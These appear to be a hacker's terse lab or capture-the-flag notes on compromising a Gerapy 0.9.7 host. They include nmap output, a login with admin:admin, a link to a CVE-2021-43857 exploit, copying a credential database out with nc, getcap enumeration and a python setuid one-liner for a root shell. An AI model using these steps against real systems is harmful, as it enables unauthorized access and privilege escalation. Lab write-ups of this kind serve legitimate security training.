22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
| http-methods: 
|_  Supported Methods: OPTIONS GET
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


port 8000  gerapy logged in with admin:admin   Copyright © 2026 Gerapy v0.9.7 All Rights Reserved. 
<img width="1401" height="729" alt="image" src="https://github.com/user-attachments/assets/4eb39010-fcf4-43c4-a5f8-675a36e64898" />  
<img width="1918" height="445" alt="image" src="https://github.com/user-attachments/assets/bdafc4fb-2987-4074-9cca-e33e7b332ac5" />
https://github.com/ProwlSec/gerapy-cve-2021-43857/blob/main/exploit.py  
<img width="830" height="391" alt="image" src="https://github.com/user-attachments/assets/b13a61a8-bf58-4296-b077-cc5243ee00da" />  
<img width="1093" height="399" alt="image" src="https://github.com/user-attachments/assets/b95f8582-b184-40f4-b2ad-307f736da74e" />

db.sqlite 3 file found in this guy. so i extract the file into my attacker machine via nc  
<img width="667" height="122" alt="image" src="https://github.com/user-attachments/assets/f34378f4-0296-45b2-a6ed-92452b8fa575" />

.tables
then select command to view auth_users  
<img width="1172" height="256" alt="image" src="https://github.com/user-attachments/assets/f3fa840d-28f8-45a6-a81e-1ef97e2c5902" />

/etc/overlayroot.conf:#     crypt:dev=/dev/vdb,pass=somepassword,mkfs=0
/etc/overlayroot.conf:#      $ MAPNAME="secure"; DEV="/dev/vdg"; PASSWORD="foobar"

scratch that. need to check for capabilities  
getcap -r / 2>/dev/null  
python getcap_setuid
<img width="940" height="125" alt="image" src="https://github.com/user-attachments/assets/09b02830-8e26-4434-b3f4-f9fa9b3f4459" />
<img width="1138" height="227" alt="image" src="https://github.com/user-attachments/assets/0ed47c46-ca3a-4caf-b02b-6bdcdd30d88c" />
python3 -c 'import os; os.setuid(0);  os.execl("/bin/sh", "sh")'  
<img width="738" height="80" alt="image" src="https://github.com/user-attachments/assets/ec770a43-0756-498d-81f8-728805e76397" />


